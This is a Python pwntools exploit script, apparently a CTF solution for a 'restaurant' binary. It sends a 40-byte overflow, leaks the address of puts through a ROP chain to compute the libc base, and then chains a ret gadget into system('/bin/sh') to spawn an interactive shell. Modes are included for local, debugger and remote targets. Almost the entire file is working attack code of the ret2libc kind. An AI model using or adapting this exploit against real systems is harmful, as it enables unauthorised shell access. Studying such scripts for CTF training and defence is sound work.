#!/usr/bin/env python3

from pwn import *

e = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(fill+0xa2)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    r.sendlineafter(b'>', b'1')
    rop = ROP(e)
    rop.raw(b'\x90' * 40)
    rop.puts(e.got.puts)
    rop.fill()
    # info(f'payload is {payload}') # For debugging only so that we know when \x00 starts in payload and we can extract the puts address
    r.sendlineafter(b'>', rop.chain())

    leaked_addr = r.recvuntil(b'>')[60:66] + b'\x00' * 2
    puts_addr = u64(leaked_addr)
    info(f'leaked puts() address is {hex(puts_addr)}')

    puts_offset = libc.sym.puts - libc.address
    libc.address = puts_addr - puts_offset
    rop = ROP(libc)
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    rop.raw(b'\x90' * 40)
    # It is unclear but looks like we need this extra ret to align something, likely the stack.
    # Gemini indicates this may be the requirement of some libc versions' system(). They require the stack to the 16-byte aligned.
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.system(bin_sh_addr)
    r.sendline(rop.chain())
    r.recvregex('Enjoy your .*\\x7f')

    r.interactive()

if __name__ == "__main__":
    main()
